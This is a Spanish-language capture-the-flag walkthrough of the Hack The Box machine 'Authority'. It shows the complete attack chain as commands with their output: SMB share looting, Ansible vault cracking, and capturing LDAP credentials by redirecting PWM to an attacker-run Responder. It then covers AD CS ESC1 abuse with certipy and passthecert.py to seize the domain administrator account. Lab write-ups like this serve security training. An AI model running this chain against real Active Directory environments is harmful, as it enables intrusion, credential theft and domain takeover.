# Enumeration

>Comenzamos con un escaneo de puertos empleando el script de escaneo automático de puertos TCP creado por mí:

```bash
┌──(kali㉿jbkira)-[~]
└─$ sudo AutoNmap.sh 10.129.213.10
AutoNmap By JBKira
Puertos TCP abiertos:
53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49667,49673,49690,49691,49694,49696,49705,49716,57232,57278
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-25 23:11:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
|_SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
|_ssl-date: 2025-04-25T23:12:11+00:00; +4h01m24s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
|_SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
|_ssl-date: 2025-04-25T23:12:12+00:00; +4h01m24s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-04-25T23:12:11+00:00; +4h01m24s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
|_SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-04-25T23:12:12+00:00; +4h01m24s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
|_SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/http      Apache Tomcat (language: en)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=172.16.2.118
| Issuer: commonName=172.16.2.118
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-23T22:28:06
| Not valid after:  2027-04-26T10:06:30
| MD5:   2cfb:141d:13a5:ec27:1bc5:96cb:468d:4cc8
|_SHA-1: aeff:19ab:00c0:d335:f7ae:490a:a789:5264:5dbd:72da
|_http-favicon: Unknown favicon MD5: F588322AAF157D82BB030AF1EFFD8CF9
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
|_ssl-date: TLS randomness does not represent time
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
57232/tcp open  msrpc         Microsoft Windows RPC
57278/tcp open  msrpc         Microsoft Windows RPC
|_clock-skew: mean: 4h01m23s, deviation: 0s, median: 4h01m23s
| smb2-time: 
|   date: 2025-04-25T23:12:04
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

> Vamos a enumerar la versión de Windows y el dominio de Active Directory empleando crackmapexec:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec smb 10.129.213.10 2>/dev/null
SMB         10.129.213.10   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
```

> Vamos a agregar el dominio a nuestro resolutor local (/etc/hosts) para que pueda resolver el nombre de dominio:

```bash
┌──(kali㉿jbkira)-[~]
└─$ echo "10.129.213.10 authority.authority.htb authority.htb" >> /etc/hosts
```

>Si entramos al sitio web alojado en el puerto 8443 vemos un Password Self Service

>Vamos a listar los shares al usuario anónimo, aquí podemos ver que hay uno interesante llamado Development:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/authority]
└─$ smbclient -L \\\\10.129.213.10\\ -U ""             
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Department Shares Disk      
        Development     Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share
```

>Nos descargamos el contenido del share para poder enumerarlo mejor:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/authority]
└─$ smbclient \\\\10.129.213.10\\Development -U "" 
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 17 09:20:38 2023
  ..                                  D        0  Fri Mar 17 09:20:38 2023
  Automation                          D        0  Fri Mar 17 09:20:40 2023

                5888511 blocks of size 4096. 1408341 blocks available
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

>En un archivo encontramos credenciales de tomcat:
>`tomcat:T0mc@tAdm1n` `robot:T0mc@tR00t`

```bash
┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
└─$ cat templates/tomcat-users.xml.j2 
<?xml version='1.0' encoding='cp1252'?>

<tomcat-users xmlns="http://tomcat.apache.org/xml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
 version="1.0">

<user username="admin" password="T0mc@tAdm1n" roles="manager-gui"/>  
<user username="robot" password="T0mc@tR00t" roles="manager-script"/>

</tomcat-users>
```

>Vemos otro archivo con credenciales:

```bash
┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
└─$ cat ansible_inventory 
ansible_user: administrator
ansible_password: Welcome1
ansible_port: 5985
ansible_connection: winrm
ansible_winrm_transport: ntlm
ansible_winrm_server_cert_validation: ignore
```

>Y otro con credenciales encriptadas:

```bash
┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
└─$ cat defaults/main.yml 
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```

>Vamos a tomar los hashes y prepararlos con ansible2john para poder crackearlos:

```bash
┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
└─$ ansible2john ldap_password_ansible             
ldap_password_ansible:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635

┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
└─$ ansible2john pwm_admin_pwd 
pwm_admin_pwd:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5

┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
└─$ ansible2john pwm_admin_login 
pwm_admin_login:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
```

>Vemos que son crackeables:

```bash
┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
└─$ john -w=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 128/128 AVX 4x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^&*         (pwm_admin_pwd)     
!@#$%^&*         (pwm_admin_login)     
!@#$%^&*         (ldap_password_ansible)     
3g 0:00:01:00 DONE (2025-04-25 15:44) 0.04951g/s 657.0p/s 1971c/s 1971C/s 001983..victor2
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

>Vamos a emplear ansible-vault para obtener el valor real de cada hash:

```bash
┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
└─$ ansible-vault decrypt pwm_admin_login --output pwm_admin_login.decr
Vault password: 
Decryption successful
                                                                                                                                                                            
┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
└─$ ansible-vault decrypt pwm_admin_pwd --output pwm_admin_pwd.decr   
Vault password: 
Decryption successful
                                                                                                                                                                            
┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
└─$ ansible-vault decrypt ldap_password_ansible --output ldap_password_ansible.decr
Vault password: 
Decryption successful
```

>Con esto conseguimos dos credenciales: `svc_pwm:pWm_@dm!N_!23` y `svc_ldap:DevT3st@123`

```bash
┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
└─$ cat pwm_admin_login.decr 
svc_pwm                                                                                                                                                                            
┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
└─$ cat pwm_admin_pwd.decr                        
pWm_@dm!N_!23                                                                                                                                                                            
┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
└─$ cat ldap_password_ansible.decr 
DevT3st@123
```

>Vamos a probarlas con crackmapexec:

```bash
┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
└─$ crackmapexec smb 10.129.213.10 -u 'svc_ldap' -p 'DevT3st@123' 2>/dev/null
SMB         10.129.213.10   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.213.10   445    AUTHORITY        [-] authority.htb\svc_ldap:DevT3st@123 STATUS_LOGON_FAILURE 
                                                                                                                                                                            
┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
└─$ crackmapexec smb 10.129.213.10 -u 'svc_pwm' -p 'pWm_@dm!N_!23' 2>/dev/null 
SMB         10.129.213.10   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.213.10   445    AUTHORITY        [+] authority.htb\svc_pwm:pWm_@dm!N_!23
```

>Si accedemos al Configuration Manager del PWM vemos que nos pide una contraseña, la cual es la que obtuvimos previamente:

![image](https://github.com/user-attachments/assets/f0739f91-8025-47ff-b602-caa2115f1a6c)

>Teniendo acceso a editar la configuración vamos a intentar realizar un ataque para obtener la contraseña en texto plano del usuario que está configurado para acceder al servidor LDAP al cambiar el servidor LDAP al que apunta a nuestra máquina atacante:

![image](https://github.com/user-attachments/assets/53a5ee96-9696-411f-8720-ec719c80eed3)

>Establecemos la siguiente url:

```bash
ldap://10.10.14.157:389
```

>Iniciamos responder para interceptar la autenticación y al darle a comprobar perfil obtenemos credenciales en texto plano: `svc_ldap:lDaP_1n_th3_cle4r!`

```bash
┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

<SNIP>

[+] Listening for events...                                                                                                                                                 

[LDAP] Cleartext Client   : 10.129.213.10
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
```

>Vamos a probarlas con crackmapexec:

```bash
┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
└─$ crackmapexec smb 10.129.213.10 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' 2>/dev/null
SMB         10.129.213.10   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.213.10   445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
```

>Vamos a obtener mediante el collector bloodhound-python archivos bloodhound para analizar posibles vectores de ataque para escalar privilegios en el dominio:

```bash
┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
└─$ bloodhound-python -u 'svc_ldap' -ns 10.129.213.10 -d authority.htb -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
Password: 
INFO: Found AD domain: authority.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: authority.authority.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: authority.authority.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 5 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: authority.authority.htb
INFO: Done in 00M 13S
```

>Abrimos bloodhound e inicializamos el servicio neo4j, importando los archivos resultantes:

```bash
sudo neo4j start
bloodhound &>/dev/null & disown
```

>Vemos que el usuario pertenece al grupo Remote Management Users que podemos explotar para obtener una shell como dicho usuario en el DC, donde podemos ver la flag user.txt:

![image](https://github.com/user-attachments/assets/c346df2b-3611-4623-b1f1-aa682db81be7)

```bash
┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
└─$ evil-winrm -i 10.129.213.10 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'         
                                        
Evil-WinRM shell v3.7
                                        
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> ls ../Desktop


    Directory: C:\Users\svc_ldap\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/25/2025   6:29 PM             34 user.txt
```

# Privilege Escalation

>Vamos a buscar si hay vulnerabilidades en el AD CS:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/authority]
└─$ certipy-ad find -vulnerable -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.213.10 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Saved BloodHound data to '20250425161546_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250425161546_Certipy.txt'
[*] Saved JSON output to '20250425161546_Certipy.json'
```

>Por lo que podemos ver si la hay, en concreto, deberemos explotar un ECS1:

```JSON
"[!] Vulnerabilities": {
        "ESC1": "'AUTHORITY.HTB\\\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication"
}
```

>Datos importantes obtenidos del archivo resultante para realizar la explotación:

```JSON
"CA Name": "AUTHORITY-CA"
"Template Name": "CorpVPN"
"Enrollment Permissions": {
          "Enrollment Rights": [
            "AUTHORITY.HTB\\Domain Computers",
            "AUTHORITY.HTB\\Domain Admins",
            "AUTHORITY.HTB\\Enterprise Admins"
          ]
        }
```

> Aprovecharemos esta vulnerabilidad para escalar privilegios pidiendo un certificado pfx del usuario administrador para así poder impersonarlo al obtener su hash NTLM y ganar acceso a este.

> Para ello, debemos obtener acceso a una cuenta de alguno de los grupos listados anteriormente, por suerte, nuestro usuario tiene los privilegios SeMachineAccountPrivilege 

```powershell
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

>Estos privilegios nos permiten añadir computer accounts al dominio, lo aprovecharemos con la siguiente utilidad de impacket:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/authority]
└─$ impacket-addcomputer -computer-name 'jbkira' -computer-pass 'Password123' -dc-host authority.authority.htb -domain-netbios authority.htb 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account jbkira$ with password Password123.
```

>Ahora vamos a pedir el certificado .pfx del administrador aprovechando la template vulnerable ahora que tenemos una cuenta del grupo Domain Computers:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/authority]
└─$ certipy-ad req -username 'jbkira$@authority.htb' -p 'Password123' -ca AUTHORITY-CA -target authority.authority.htb -template CorpVPN -upn administrator@authority.htb -debug  
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'authority.authority.htb' at '80.58.61.250'
[+] Trying to resolve 'AUTHORITY.HTB' at '80.58.61.250'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.213.10[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.213.10[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 5
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

>Vamos a obtener del certificado un archivo .crt y otro .key

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/authority]
└─$ certipy cert -pfx administrator.pfx -nokey -out user.crt
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'user.crt'
                                                                                                                                                                            
┌──(kali㉿jbkira)-[~/Desktop/machines/authority]
└─$ certipy cert -pfx administrator.pfx -nocert -out user.key
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing private key to 'user.key'
```

>Ahora vamos a emplear la siguiente herramienta para logguearnos como el usuario administrador empleando el certificado: https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/refs/heads/main/Python/passthecert.py

>Aprovecharemos esta herramienta para cambiarle la contraseña al usuario administrador:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/authority]
└─$ python3 passthecert.py -crt user.crt -key user.key -dc-ip 10.129.213.10 -domain authority.htb -action modify_user -target administrator -new-pass Password123 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully changed administrator password to: Password123

```

>Ahora nos logueamos con las credenciales nuevas desde Evil-WinRM, donde podemos ver la flag root.txt:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/authority]
└─$ evil-winrm -i 10.129.213.10 -u Administrator -p 'Password123'       
                                        
Evil-WinRM shell v3.7
                                        
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ../Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/25/2025   6:29 PM             34 root.txt
```
